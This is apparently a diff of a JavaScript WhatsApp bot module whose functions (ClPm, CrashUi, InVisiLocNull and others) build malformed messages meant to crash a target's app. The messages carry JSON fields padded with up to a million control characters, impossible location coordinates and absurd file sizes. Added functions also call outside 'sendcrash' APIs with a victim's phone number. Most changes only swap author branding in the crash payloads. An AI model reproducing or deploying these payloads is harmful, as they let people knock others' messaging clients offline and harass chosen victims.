+				const number = X.replace(/@s\.whatsapp\.net$/, '');
+				const response = await fetchJson(`https://venomweb.site/i/sendcrash?numero=${encodeURIComponent(number)}&total=70&apikey=multidevice`);
+				console.log(response);
+			} catch (error) {
+				console.error("Error Fetching Crash V2:", error);
+			}
+		}
+		async function sendCrashV3(X) {
+			try {
+				const newcrashx = await fetchJson('http://glitchwatools-apis.online:25579/sendCrash?numero=' + X);
+				console.log(newcrashx);
+			} catch (error) {
+				console.error("Error Fetching Crash:", error);
+			}
+		}
+
 		// HAX \\
 		const Qrad = {
 			key: {
@@ -544,7 +1225,7 @@ module.exports = async (VxoZap, m, chatUpdate, store) => {
 					},
 					"nativeFlowResponseMessage": {
 						"name": "galaxy_message",
-						"paramsJson": `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"𝐉𝐚𝐜𝐤 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"@JackV2\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"⭑̤⟅̊༑ ▾ 𝐙͢𝐍ͮ𝐗 ⿻ 𝐈𝐍͢𝐕𝚫𝐒𝐈͢𝚯𝚴 ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤${"\u0003".repeat(1045000)}\",\"screen_0_TextInput_1\":\"INFINITE\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
+						"paramsJson": `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"𝐑𝐚𝐝𝐢𝐭 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"@RaditX7\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"⭑̤⟅̊༑ ▾ 𝐙͢𝐍ͮ𝐗 ⿻ 𝐈𝐍͢𝐕𝚫𝐒𝐈͢𝚯𝚴 ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤${"\u0003".repeat(1045000)}\",\"screen_0_TextInput_1\":\"INFINITE\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
 						"version": 3
 					}
 				}
@@ -565,7 +1246,7 @@ module.exports = async (VxoZap, m, chatUpdate, store) => {
 					},
 					"nativeFlowResponseMessage": {
 						"name": "galaxy_message",
-						"paramsJson": `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"𝐉𝐚𝐜𝐤 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"𝐉𝐚𝐜𝐤𝐕𝟐\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"⭑̤⟅̊༑ ▾ 𝐙͢𝐍ͮ𝐗 ⿻ 𝐈𝐍͢𝐕𝚫𝐒𝐈͢𝚯𝚴 ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤${"\u0003".repeat(350000)}\",\"screen_0_TextInput_1\":\"INFINITE\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
+						"paramsJson": `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"𝐑𝐚𝐝𝐢𝐭 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"RaditX7\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"⭑̤⟅̊༑ ▾ 𝐙͢𝐍ͮ𝐗 ⿻ 𝐈𝐍͢𝐕𝚫𝐒𝐈͢𝚯𝚴 ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤${"\u0003".repeat(350000)}\",\"screen_0_TextInput_1\":\"INFINITE\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
 						"version": 3
 					}
 				}
@@ -586,7 +1267,7 @@ module.exports = async (VxoZap, m, chatUpdate, store) => {
 					},
 					"nativeFlowResponseMessage": {
 						"name": "galaxy_message",
-						"paramsJson": `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"𝐉𝐚𝐜𝐤 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"@JackV2\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"⭑̤⟅̊༑ ▾ 𝐙͢𝐍ͮ𝐗 ⿻ 𝐈𝐍͢𝐕𝚫𝐒𝐈͢𝚯𝚴 ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤${"\u0003".repeat(1020000)}\",\"screen_0_TextInput_1\":\"INFINITE\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
+						"paramsJson": `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"𝐑𝐚𝐝𝐢𝐭 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"@RaditX7\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"⭑̤⟅̊༑ ▾ 𝐙͢𝐍ͮ𝐗 ⿻ 𝐈𝐍͢𝐕𝚫𝐒𝐈͢𝚯𝚴 ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤${"\u0003".repeat(1020000)}\",\"screen_0_TextInput_1\":\"INFINITE\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
 						"version": 3
 					}
 				}
@@ -607,7 +1288,7 @@ module.exports = async (VxoZap, m, chatUpdate, store) => {
 					},
 					"nativeFlowResponseMessage": {
 						"name": "galaxy_message",
-						"paramsJson": `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"𝐉𝐚𝐜𝐤 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"@JackV2\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"⭑̤⟅̊༑ ▾ 𝐙͢𝐍ͮ𝐗 ⿻ 𝐈𝐍͢𝐕𝚫𝐒𝐈͢𝚯𝚴 ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤${"\u0003".repeat(777777)}\",\"screen_0_TextInput_1\":\"INFINITE\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
+						"paramsJson": `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"𝐑𝐚𝐝𝐢𝐭 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"@RaditX7\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"⭑̤⟅̊༑ ▾ 𝐙͢𝐍ͮ𝐗 ⿻ 𝐈𝐍͢𝐕𝚫𝐒𝐈͢𝚯𝚴 ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤${"\u0003".repeat(777777)}\",\"screen_0_TextInput_1\":\"INFINITE\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
 						"version": 3
 					}
 				}
@@ -626,8 +1307,8 @@ module.exports = async (VxoZap, m, chatUpdate, store) => {
 									"locationMessage": {
 										"degreesLatitude": -999.03499999999999,
 										"degreesLongitude": 922.999999999999,
-										"name": "𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️",
-										"address": "✨⃟༑⌁⃰𝐉𝐚𝐜𝐤 𝐂𝐫𝐚𝐬𝐡 ϟ〽️",
+										"name": "𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉",
+										"address": "🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉",
 										"jpegThumbnail": ThM
 									},
 									hasMediaAttachment: true
@@ -636,13 +1317,13 @@ module.exports = async (VxoZap, m, chatUpdate, store) => {
 									text: ""
 								},
 								nativeFlowMessage: {
-									messageParamsJson: " 𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂 𝐁𝐔𝐆 𝐕𝟐〽️ ",
+									messageParamsJson: " 𝐌𝐲𝐬𝐭𝐞𝐫𝐢𝐨𝐮𝐬 𝐌𝐞𝐧 𝐈𝐧 𝐂𝐲𝐛𝐞𝐫𝐒𝐩𝐚𝐜𝐞♻️ ",
 									buttons: [{
 											name: "single_select",
 											buttonParamsJson: {
-												"title": "✨⃟༑⌁⃰𝐉𝐚𝐜𝐤 𝐂𝐫𝐚𝐬𝐡 ϟ〽️",
+												"title": "🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉",
 												"sections": [{
-													"title": "𝐉𝐚𝐜𝐤 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ",
+													"title": "𝐑𝐚𝐝𝐢𝐭 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ",
 													"rows": []
 												}]
 											}
@@ -666,7 +1347,7 @@ module.exports = async (VxoZap, m, chatUpdate, store) => {
 					jid: X
 				}
 			} : {});
-			console.log(chalk.green("Send Bug By AkmalMods〽️"));
+			console.log(chalk.green("Send Bug By GetsuzoZhiro🐉"));
 		};
 
 		async function InVisiLocNull(X, Qtd, ThM, ptcp = false) {
@@ -680,8 +1361,8 @@ module.exports = async (VxoZap, m, chatUpdate, store) => {
 									"locationMessage": {
 										"degreesLatitude": -999.03499999999999,
 										"degreesLongitude": 922.999999999999,
-										"name": "𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️",
-										"address": "✨⃟༑⌁⃰𝐉𝐚𝐜𝐤 𝐂𝐫𝐚𝐬𝐡 ϟ〽️",
+										"name": "𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉",
+										"address": "🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉",
 										"jpegThumbnail": ThM
 									},
 									hasMediaAttachment: true
@@ -690,13 +1371,13 @@ module.exports = async (VxoZap, m, chatUpdate, store) => {
 									text: ""
 								},
 								nativeFlowMessage: {
-									messageParamsJson: " 𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂 𝐁𝐔𝐆 𝐕𝟐〽️ ",
+									messageParamsJson: " 𝐌𝐲𝐬𝐭𝐞𝐫𝐢𝐨𝐮𝐬 𝐌𝐞𝐧 𝐈𝐧 𝐂𝐲𝐛𝐞𝐫𝐒𝐩𝐚𝐜𝐞♻️ ",
 									buttons: [{
 											name: "single_select",
 											buttonParamsJson: {
-												"title": "✨⃟༑⌁⃰𝐉𝐚𝐜𝐤 𝐂𝐫𝐚𝐬𝐡 ϟ〽️",
+												"title": "🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉",
 												"sections": [{
-													"title": "𝐉𝐚𝐜𝐤 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ",
+													"title": "𝐑𝐚𝐝𝐢𝐭 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ",
 													"rows": []
 												}]
 											}
@@ -720,7 +1401,7 @@ module.exports = async (VxoZap, m, chatUpdate, store) => {
 					jid: X
 				}
 			} : {});
-			console.log(chalk.green("Send Bug By AkmalMods〽️"));
+			console.log(chalk.green("Send Bug By GetsuzoZhiro🐉"));
 		};
 
 		async function InVisiLocXz(X, ThM, ptcp = false) {
@@ -734,8 +1415,8 @@ module.exports = async (VxoZap, m, chatUpdate, store) => {
 									"locationMessage": {
 										"degreesLatitude": -999.03499999999999,
 										"degreesLongitude": 922.999999999999,
-										"name": "𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️",
-										"address": "✨⃟༑⌁⃰𝐉𝐚𝐜𝐤 𝐂𝐫𝐚𝐬𝐡 ϟ〽️",
+										"name": "𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉",
+										"address": "🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉",
 										"jpegThumbnail": ThM
 									},
 									hasMediaAttachment: true
@@ -744,13 +1425,13 @@ module.exports = async (VxoZap, m, chatUpdate, store) => {
 									text: ""
 								},
 								nativeFlowMessage: {
-									messageParamsJson: " 𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂 𝐁𝐔𝐆 𝐕𝟐〽️ ",
+									messageParamsJson: " 𝐌𝐲𝐬𝐭𝐞𝐫𝐢𝐨𝐮𝐬 𝐌𝐞𝐧 𝐈𝐧 𝐂𝐲𝐛𝐞𝐫𝐒𝐩𝐚𝐜𝐞♻️ ",
 									buttons: [{
 											name: "single_select",
 											buttonParamsJson: {
-												"title": "✨⃟༑⌁⃰𝐉𝐚𝐜𝐤 𝐂𝐫𝐚𝐬𝐡 ϟ〽️",
+												"title": "🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉",
 												"sections": [{
-													"title": "𝐉𝐚𝐜𝐤 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ",
+													"title": "𝐑𝐚𝐝𝐢𝐭 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ",
 													"rows": []
 												}]
 											}
@@ -774,7 +1455,7 @@ module.exports = async (VxoZap, m, chatUpdate, store) => {
 					jid: X
 				}
 			} : {});
-			console.log(chalk.green("Send Bug By AkmalMods〽️"));
+			console.log(chalk.green("Send Bug By GetsuzoZhiro🐉"));
 		};
 
 		async function InVisiXz(X, ThM, cct = false, ptcp = false) {
@@ -792,7 +1473,7 @@ module.exports = async (VxoZap, m, chatUpdate, store) => {
 										fileLength: "9999999999999",
 										pageCount: 9007199254740991,
 										mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
-										fileName: "🩸𝐉𝐚𝐜𝐤 𝐂𝐫𝐚𝐬𝐡 ϟ🦠",
+										fileName: "🩸⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠",
 										fileEncSha256: "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
 										directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
 										mediaKeyTimestamp: "1723855952",
@@ -812,7 +1493,7 @@ module.exports = async (VxoZap, m, chatUpdate, store) => {
 									buttons: [
 										cct ? {
 											name: "single_select",
-											buttonParamsJson: "{\"title\":\"✨⃟༑⌁⃰𝐉𝐚𝐜𝐤 𝐂𝐫𝐚𝐬𝐡 ϟ〽️" + "᬴".repeat(0) + "\",\"sections\":[{\"title\":\"𝐉𝐚𝐜𝐤 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ\",\"rows\":[]}]}"
+											buttonParamsJson: "{\"title\":\"🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉" + "᬴".repeat(0) + "\",\"sections\":[{\"title\":\"𝐑𝐚𝐝𝐢𝐭 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ\",\"rows\":[]}]}"
 										} : {
 											name: "payment_method",
 											buttonParamsJson: ""
@@ -827,7 +1508,7 @@ module.exports = async (VxoZap, m, chatUpdate, store) => {
 										},
 										{
 											name: "single_select",
-											buttonParamsJson: "{\"title\":\"✨⃟༑⌁⃰𝐉𝐚𝐜𝐤 𝐂𝐫𝐚𝐬𝐡 ϟ〽️\",\"sections\":[{\"title\":\"𝐉𝐚𝐜𝐤 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ\",\"rows\":[]}]}"
+											buttonParamsJson: "{\"title\":\"🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉\",\"sections\":[{\"title\":\"𝐑𝐚𝐝𝐢𝐭 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ\",\"rows\":[]}]}"
 										},
 										{
 											name: "galaxy_message",
@@ -853,7 +1534,7 @@ module.exports = async (VxoZap, m, chatUpdate, store) => {
 					jid: X
 				}
 			} : {});
-			console.log(chalk.green("Send Bug By AkmalMods〽️"));
+			console.log(chalk.green("Send Bug By GetsuzoZhiro🐉"));
 		};
 
 		async function ClPm(X, ThM, cct = false, ptcp = false) {
@@ -871,7 +1552,7 @@ module.exports = async (VxoZap, m, chatUpdate, store) => {
 										fileLength: "9999999999999",
 										pageCount: 9007199254740991,
 										mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
-										fileName: "🩸𝐉𝐚𝐜𝐤 𝐂𝐫𝐚𝐬𝐡 ϟ🦠",
+										fileName: "🩸⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠",
 										fileEncSha256: "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
 										directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
 										mediaKeyTimestamp: "1723855952",
@@ -884,14 +1565,14 @@ module.exports = async (VxoZap, m, chatUpdate, store) => {
 									hasMediaAttachment: true
 								},
 								body: {
-									text: "𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️"
+									text: "𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉"
 								},
 								nativeFlowMessage: {
 									messageParamsJson: "{\"name\":\"galaxy_message\",\"title\":\"oi\",\"header\":\" # trashdex - explanation \",\"body\":\"xxx\"}",
 									buttons: [
 										cct ? {
 											name: "single_select",
-											buttonParamsJson: "{\"title\":\"✨⃟༑⌁⃰𝐉𝐚𝐜𝐤 𝐂𝐫𝐚𝐬𝐡 ϟ〽️" + "᬴".repeat(0) + "\",\"sections\":[{\"title\":\"𝐉𝐚𝐜𝐤 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ\",\"rows\":[]}]}"
+											buttonParamsJson: "{\"title\":\"🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉" + "᬴".repeat(0) + "\",\"sections\":[{\"title\":\"𝐑𝐚𝐝𝐢𝐭 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ\",\"rows\":[]}]}"
 										} : {
 											name: "payment_method",
 											buttonParamsJson: ""
@@ -906,7 +1587,7 @@ module.exports = async (VxoZap, m, chatUpdate, store) => {
 										},
 										{
 											name: "single_select",
-											buttonParamsJson: "{\"title\":\"✨⃟༑⌁⃰𝐉𝐚𝐜𝐤 𝐂𝐫𝐚𝐬𝐡 ϟ〽️\",\"sections\":[{\"title\":\"𝐉𝐚𝐜𝐤 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ\",\"rows\":[]}]}"
+											buttonParamsJson: "{\"title\":\"🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉\",\"sections\":[{\"title\":\"𝐑𝐚𝐝𝐢𝐭 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ\",\"rows\":[]}]}"
 										},
 										{
 											name: "galaxy_message",
@@ -932,7 +1613,7 @@ module.exports = async (VxoZap, m, chatUpdate, store) => {
 					jid: X
 				}
 			} : {});
-			console.log(chalk.green("Send Bug By AkmalMods〽️"));
+			console.log(chalk.green("Send Bug By GetsuzoZhiro🐉"));
 		};
 
 		async function ClPmNull(X, Qtd, ThM, cct = false, ptcp = false) {
@@ -950,7 +1631,7 @@ module.exports = async (VxoZap, m, chatUpdate, store) => {
 										fileLength: "9999999999999",
 										pageCount: 9007199254740991,
 										mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
-										fileName: "🩸𝐉𝐚𝐜𝐤 𝐂𝐫𝐚𝐬𝐡 ϟ🦠",
+										fileName: "🩸⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠",
 										fileEncSha256: "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
 										directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
 										mediaKeyTimestamp: "1723855952",
@@ -970,7 +1651,7 @@ module.exports = async (VxoZap, m, chatUpdate, store) => {
 									buttons: [
 										cct ? {
 											name: "single_select",
-											buttonParamsJson: "{\"title\":\"✨⃟༑⌁⃰𝐉𝐚𝐜𝐤 𝐂𝐫𝐚𝐬𝐡 ϟ〽️" + "᬴".repeat(0) + "\",\"sections\":[{\"title\":\"𝐉𝐚𝐜𝐤 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ\",\"rows\":[]}]}"
+											buttonParamsJson: "{\"title\":\"🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉" + "᬴".repeat(0) + "\",\"sections\":[{\"title\":\"𝐑𝐚𝐝𝐢𝐭 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ\",\"rows\":[]}]}"
 										} : {
 											name: "payment_method",
 											buttonParamsJson: ""
@@ -985,7 +1666,7 @@ module.exports = async (VxoZap, m, chatUpdate, store) => {
 										},
 										{
 											name: "single_select",
-											buttonParamsJson: "{\"title\":\"✨⃟༑⌁⃰𝐉𝐚𝐜𝐤 𝐂𝐫𝐚𝐬𝐡 ϟ〽️\",\"sections\":[{\"title\":\"𝐉𝐚𝐜𝐤 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ\",\"rows\":[]}]}"
+											buttonParamsJson: "{\"title\":\"🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉\",\"sections\":[{\"title\":\"𝐑𝐚𝐝𝐢𝐭 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ\",\"rows\":[]}]}"
 										},
 										{
 											name: "galaxy_message",
@@ -1011,7 +1692,7 @@ module.exports = async (VxoZap, m, chatUpdate, store) => {
 					jid: X
 				}
 			} : {});
-			console.log(chalk.green("Send Bug By AkmalMods〽️"));
+			console.log(chalk.green("Send Bug By GetsuzoZhiro🐉"));
 		};
 
 		async function CrashUi(X, Qtd, ThM, cct = false, ptcp = false) {
@@ -1029,7 +1710,7 @@ module.exports = async (VxoZap, m, chatUpdate, store) => {
 										fileLength: "9999999999999",
 										pageCount: 9007199254740991,
 										mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
-										fileName: "🩸𝐉𝐚𝐜𝐤 𝐂𝐫𝐚𝐬𝐡 ϟ🦠",
+										fileName: "🩸⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠",
 										fileEncSha256: "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
 										directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
 										mediaKeyTimestamp: "1723855952",
@@ -1049,7 +1730,7 @@ module.exports = async (VxoZap, m, chatUpdate, store) => {
 									buttons: [
 										cct ? {
 											name: "single_select",
-											buttonParamsJson: "{\"title\":\"✨⃟༑⌁⃰𝐉𝐚𝐜𝐤 𝐂𝐫𝐚𝐬𝐡 ϟ〽️" + "᬴".repeat(0) + "\",\"sections\":[{\"title\":\"𝐉𝐚𝐜𝐤 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ\",\"rows\":[]}]}"
+											buttonParamsJson: "{\"title\":\"🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉" + "᬴".repeat(0) + "\",\"sections\":[{\"title\":\"𝐑𝐚𝐝𝐢𝐭 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ\",\"rows\":[]}]}"
 										} : {
 											name: "payment_method",
 											buttonParamsJson: ""
@@ -1064,7 +1745,7 @@ module.exports = async (VxoZap, m, chatUpdate, store) => {
 										},
 										{
 											name: "single_select",
-											buttonParamsJson: "{\"title\":\"✨⃟༑⌁⃰𝐉𝐚𝐜𝐤 𝐂𝐫𝐚𝐬𝐡 ϟ〽️\",\"sections\":[{\"title\":\"𝐉𝐚𝐜𝐤 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ\",\"rows\":[]}]}"
+											buttonParamsJson: "{\"title\":\"🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉\",\"sections\":[{\"title\":\"𝐑𝐚𝐝𝐢𝐭 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ\",\"rows\":[]}]}"
 										},
 										{
 											name: "galaxy_message",
@@ -1090,7 +1771,7 @@ module.exports = async (VxoZap, m, chatUpdate, store) => {
 					jid: X
 				}
 			} : {});
-			console.log(chalk.green("Send Bug By AkmalMods〽️"));
+			console.log(chalk.green("Send Bug By GetsuzoZhiro🐉"));
 		};
 
 		async function ZnX(X, Txt, Amount, Ptcp = true) {
@@ -1117,7 +1798,7 @@ module.exports = async (VxoZap, m, chatUpdate, store) => {
 					}
 				} : {}
 			);
-			console.log(chalk.green("Send Bug By AkmalMods〽️"));
+			console.log(chalk.green("Send Bug By GetsuzoZhiro🐉"));
 		};
 
 		async function CrL(X, Qtd, Txt, Ptcp = true) {
@@ -1150,7 +1831,7 @@ module.exports = async (VxoZap, m, chatUpdate, store) => {
 					jid: X
 				}
 			} : {});
-			console.log(chalk.green("Send Bug By AkmalMods〽️"));
+			console.log(chalk.green("Send Bug By GetsuzoZhiro🐉"));
 		};
 
 		async function ZnXIvS(X, Ptcp = true) {
@@ -1168,7 +1849,7 @@ module.exports = async (VxoZap, m, chatUpdate, store) => {
 							},
 							nativeFlowMessage: {
 								name: "call_permission_request",
-								messageParamsJson: " 𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️ "
+								messageParamsJson: " 𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉 "
 							},
 							carouselMessage: {}
 						}
@@ -1184,7 +1865,7 @@ module.exports = async (VxoZap, m, chatUpdate, store) => {
 					jid: X
 				}
 			} : {});
-			console.log(chalk.green("Send Bug By AkmalMods〽️"));
+			console.log(chalk.green("Send Bug By GetsuzoZhiro🐉"));
 		};
 
 		async function OutOff(X, Ptcp = true) {
